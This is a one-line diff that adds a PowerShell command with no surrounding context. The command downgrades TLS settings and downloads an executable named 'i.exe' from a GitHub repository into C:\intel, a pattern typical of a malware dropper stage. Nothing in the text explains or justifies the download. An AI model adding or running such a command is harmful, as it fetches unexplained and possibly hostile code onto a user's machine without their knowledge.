@@ -1,0 +1,1 @@
+powershell -command "&{[System.Net.ServicePointManager]::SecurityProtocol = @('Tls12','Tls11','Tls','Ssl3'); Invoke-WebRequest -Uri 'https://github.com/normaliok/kukuxa/blob/main/i.exe' -OutFile 'C:\intel\i.exe'}"
